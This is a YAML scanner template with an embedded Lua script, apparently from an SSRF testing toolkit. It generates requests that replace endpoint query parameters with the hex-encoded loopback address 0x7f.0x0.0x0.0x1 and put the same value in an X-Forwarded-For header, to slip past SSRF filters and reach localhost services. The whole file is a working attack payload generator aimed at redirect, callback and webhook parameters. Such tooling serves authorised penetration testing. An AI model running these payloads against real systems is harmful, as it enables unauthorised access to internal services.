# 5. standard_hex_obfuscation.yaml
meta:
  id: standard_hex_obfuscation
  version: 2
  name: "Standard Hex Obfuscation"
  description: "Converts standard IPv4 to full Hexadecimal format (0x7f.0x0.0x0.0x1)"
  author: "SSRFdevil"
  created: "2026-06-18"
  updated: "2026-07-21"
  rank: 85
  confidence: 55
  severity: high
  tags: [hex, obfuscation, ipv4, encoding, localhost, bypass]
  references:
    - "https://book.hacktricks.xyz/pentesting-web/ssrf#bypass-using-ipv4-encoding"
  success_indicator: []
  failure_indicator:
    - "literal:<html"
    - "literal:<!DOCTYPE"
    - "literal:404"
    - "literal:Access Denied"
    - "literal:Forbidden"

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "http://0x7f.0x0.0x0.0x1"
        local host_value = "0x7f.0x0.0x0.0x1"
        for _, target in ipairs(targets) do
            local base_url = target.url
            for _, param in ipairs(target.params) do
                local new_url = base_url
                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end
                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = { ["X-Forwarded-For"] = host_value },
                })
            end
        end
        return results
    end
